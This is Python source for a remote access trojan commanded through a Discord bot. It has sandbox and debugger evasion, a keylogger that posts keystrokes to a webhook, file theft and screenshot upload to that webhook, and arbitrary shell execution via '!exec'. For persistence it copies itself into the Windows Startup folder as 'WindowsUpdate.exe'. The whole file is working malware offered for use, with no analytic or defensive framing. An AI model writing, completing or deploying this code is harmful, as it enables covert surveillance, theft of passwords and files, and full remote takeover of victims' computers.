import discord
import asyncio
import os
import sys
import platform
import subprocess
import requests
import time
import random
import psutil
import ctypes
import shutil
import tempfile
from cryptography.fernet import Fernet

CONFIG = {
    'token': 'YOUR_BOT_TOKEN_HERE',
    'channel_id': 123456789,
    'webhook_url': 'YOUR_WEBHOOK_URL_HERE'
}

class AntiAnalysis:
    def __init__(self):
        self.sandbox_indicators = 0
        self.max_indicators = 2
        
    def check_vm_artifacts(self):
        indicators = 0
        vm_strings = ["vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v"]
        
        try:
            system_info = platform.system().lower() + platform.node().lower()
            for vm_string in vm_strings:
                if vm_string in system_info:
                    indicators += 1
                    
            processes = [p.name().lower() for p in psutil.process_iter()]
            vm_processes = ["vboxservice", "vmwaretray", "vmtoolsd"]
            for vm_proc in vm_processes:
                if any(vm_proc in p for p in processes):
                    indicators += 1
                    
        except Exception:
            pass
            
        return indicators
    
    def check_system_resources(self):
        indicators = 0
        
        memory = psutil.virtual_memory()
        if memory.total < 2 * 1024 * 1024 * 1024:
            indicators += 1
            
        cpu_cores = psutil.cpu_count()
        if cpu_cores < 2:
            indicators += 1
            
        return indicators
    
    def check_running_time(self):
        try:
            boot_time = psutil.boot_time()
            current_time = time.time()
            if (current_time - boot_time) < 300:
                return 1
        except:
            pass
        return 0
    
    def check_debugger(self):
        try:
            if hasattr(ctypes, 'windll'):
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    return 1
        except:
            pass
        return 0
    
    def perform_evasion_checks(self):
        total_indicators = 0
        total_indicators += self.check_vm_artifacts()
        total_indicators += self.check_system_resources()
        total_indicators += self.check_running_time()
        total_indicators += self.check_debugger()
        
        if total_indicators >= self.max_indicators:
            sys.exit(0)
            
        time.sleep(random.randint(10, 30))
        return True

class Keylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.log = ""
        self.session_id = os.urandom(4).hex()
        
    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            elif key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key.name}]"
            
            if len(self.log) > 300:
                self.send_logs()
                
        except Exception:
            pass
    
    def send_logs(self):
        if not self.log.strip():
            return
            
        try:
            embed = {
                "title": "Keylogger",
                "description": f"```{self.log[-1000:]}```",
                "color": 0x7289DA
            }
            requests.post(self.webhook_url, json={"embeds": [embed]}, timeout=5)
            self.log = ""
        except Exception:
            pass
    
    def start(self):
        try:
            from pynput import keyboard
            def run_keylogger():
                with keyboard.Listener(on_press=self.on_press) as listener:
                    listener.join()
            
            import threading
            thread = threading.Thread(target=run_keylogger, daemon=True)
            thread.start()
        except Exception:
            pass

class FileSystemOps:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        
    def list_directory(self, path="."):
        try:
            if not os.path.exists(path):
                return f"Path not found: {path}"
                
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                try:
                    if os.path.isfile(full_path):
                        size = os.path.getsize(full_path)
                        items.append(f"{item} ({size} bytes)")
                    else:
                        items.append(f"{item}/")
                except:
                    items.append(f"{item}")
            
            result = f"Contents of {path}:\n" + "\n".join(items[:15])
            if len(items) > 15:
                result += f"\n... {len(items) - 15} more"
            return result
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return f"File not found: {file_path}"
                
            file_size = os.path.getsize(file_path)
            if file_size > 8 * 1024 * 1024:
                return "File too large"
                
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f.read())}
                requests.post(self.webhook_url, files=files, timeout=30)
            return f"File sent: {file_path}"
            
        except Exception as e:
            return f"Download failed: {str(e)}"
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "Command executed"
            if len(output) > 1500:
                output = output[:1500] + "\n... (truncated)"
            return f"```\n{output}\n```"
        except Exception as e:
            return f"Command failed: {str(e)}"

class ScreenshotCapture:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        
    def capture_and_send(self):
        try:
            import mss
            with mss.mss() as sct:
                filename = f"screenshot_{int(time.time())}.png"
                sct.shot(output=filename)
                with open(filename, 'rb') as f:
                    files = {'file': (filename, f.read())}
                    requests.post(self.webhook_url, files=files, timeout=15)
                os.remove(filename)
                return "Screenshot sent"
        except Exception as e:
            return f"Screenshot failed: {str(e)}"

class PersistenceManager:
    def setup_persistence(self):
        try:
            if platform.system() == "Windows":
                startup_path = os.path.join(
                    os.environ['APPDATA'],
                    'Microsoft', 'Windows', 'Start Menu', 
                    'Programs', 'Startup',
                    'WindowsUpdate.exe'
                )
                
                current_file = sys.executable
                if not os.path.exists(startup_path):
                    shutil.copy2(current_file, startup_path)
                    return "Persistence established"
                return "Persistence exists"
            return "Windows only"
        except Exception as e:
            return f"Persistence error: {str(e)}"

class DiscordC2:
    def __init__(self, token, channel_id, webhook_url):
        self.token = token
        self.channel_id = channel_id
        self.webhook_url = webhook_url
        self.anti_analysis = AntiAnalysis()
        self.keylogger = Keylogger(webhook_url)
        self.filesystem = FileSystemOps(webhook_url)
        self.screenshot = ScreenshotCapture(webhook_url)
        self.persistence = PersistenceManager()
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.client = discord.Client(intents=intents)
        self.setup_handlers()
    
    def setup_handlers(self):
        @self.client.event
        async def on_ready():
            if not self.anti_analysis.perform_evasion_checks():
                sys.exit(0)
                
            self.keylogger.start()
            channel = self.client.get_channel(self.channel_id)
            if channel:
                embed = discord.Embed(title="System Online", color=0x00ff00)
                embed.add_field(name="Hostname", value=platform.node(), inline=True)
                embed.add_field(name="User", value=os.getlogin(), inline=True)
                await channel.send(embed=embed)
        
        @self.client.event
        async def on_message(message):
            if message.channel.id != self.channel_id:
                return
            if message.author == self.client.user:
                return
            await self.handle_command(message)
    
    async def handle_command(self, message):
        content = message.content
        
        if content.startswith('!exec'):
            await self.execute_command(message)
        elif content.startswith('!download'):
            await self.download_file(message)
        elif content.startswith('!screenshot'):
            await self.take_screenshot(message)
        elif content.startswith('!sysinfo'):
            await self.system_info(message)
        elif content.startswith('!persistence'):
            await self.establish_persistence(message)
        elif content.startswith('!list_dir'):
            await self.list_directory(message)
        elif content.startswith('!kill'):
            await message.channel.send("Shutting down")
            sys.exit(0)
    
    async def execute_command(self, message):
        command = message.content[6:]
        result = self.filesystem.execute_command(command)
        await message.channel.send(result)
    
    async def download_file(self, message):
        file_path = message.content[10:]
        await message.channel.send(f"Downloading: {file_path}")
        def download():
            result = self.filesystem.download_file(file_path)
            asyncio.run_coroutine_threadsafe(message.channel.send(result), self.client.loop)
        import threading
        threading.Thread(target=download, daemon=True).start()
    
    async def take_screenshot(self, message):
        await message.channel.send("Capturing screenshot")
        result = self.screenshot.capture_and_send()
        await message.channel.send(result)
    
    async def system_info(self, message):
        try:
            info = {
                "System": platform.system(),
                "Node": platform.node(),
                "Release": platform.release(),
                "CPU Cores": psutil.cpu_count(),
                "Memory": f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
                "Current User": os.getlogin()
            }
            info_str = "\n".join([f"{k}: {v}" for k, v in info.items()])
            await message.channel.send(f'```\n{info_str}\n```')
        except Exception as e:
            await message.channel.send(f'System info error: {str(e)}')
    
    async def establish_persistence(self, message):
        result = self.persistence.setup_persistence()
        await message.channel.send(result)
    
    async def list_directory(self, message):
        parts = message.content.split(' ', 1)
        path = parts[1] if len(parts) > 1 else "."
        result = self.filesystem.list_directory(path)
        await message.channel.send(result)
    
    def run(self):
        try:
            self.client.run(self.token)
        except Exception as e:
            pass

if __name__ == "__main__":
    c2 = DiscordC2(CONFIG['token'], CONFIG['channel_id'], CONFIG['webhook_url'])
    c2.run()